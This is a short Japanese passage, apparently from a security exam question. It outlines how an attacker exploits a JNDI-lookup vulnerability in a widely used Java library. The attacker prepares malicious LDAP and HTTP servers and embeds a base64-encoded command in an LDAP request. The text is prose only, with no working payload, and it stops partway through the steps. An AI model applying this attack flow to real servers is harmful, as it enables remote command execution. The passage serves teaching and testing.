・ライブラリHは,非常に多くのシステムで利用されており,既に脆弱性Vが攻撃に悪用されている事例が報告されている。
・脆弱性Vが存在するサーバ(以下,攻撃対象サーバという)への攻撃の流れを次に示す。
(1) 攻撃者は,事前に攻撃用LDAPサーバと攻撃用HTTPサーバを準備する。
(2) 攻撃者は,実行したいコマンド(以下,コマンドCという)をbase64でエンコードした文字列を含む,攻撃用LDAP サーバに送信するLDAPリクエスト(以下,LDAPリクエストWという)を作成する。その後,LDAPリクエストWを含み,脆弱性Vを悪用するJNDI Lookup (Java Naming and Directory Interface Lookup)を行う攻撃コードを準備する。
